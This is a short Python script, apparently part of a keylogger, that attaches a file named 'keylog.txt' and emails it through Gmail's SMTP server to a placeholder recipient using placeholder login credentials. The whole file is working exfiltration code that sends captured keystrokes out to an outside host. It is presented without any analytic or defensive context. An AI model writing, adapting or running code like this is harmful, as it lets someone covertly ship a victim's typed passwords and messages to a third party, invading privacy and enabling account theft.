import smtplib
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders

password = '<password>'
fromaddr = '<From Email addresss>'
toaddrs = '<to email address>'
subject = "sending files  test"
body = 'this is a sample text so it doesnot matter how you do it.'
file = 'keylog.txt'

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['to'] = toaddrs
msg['Subject'] = subject
msg.attach(MIMEText(body, 'plain'))
attachment = open(file, 'rb')
p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())
encoders.encode_base64(p)
p.add_header('Content-Disposition', "attachment; filename= %s" % file)
msg.attach(p)
server = smtplib.SMTP("smtp.gmail.com:587")
server.starttls()
server.login(fromaddr, password)
text = msg.as_string()
server.sendmail(fromaddr, toaddrs, text)
server.quit()
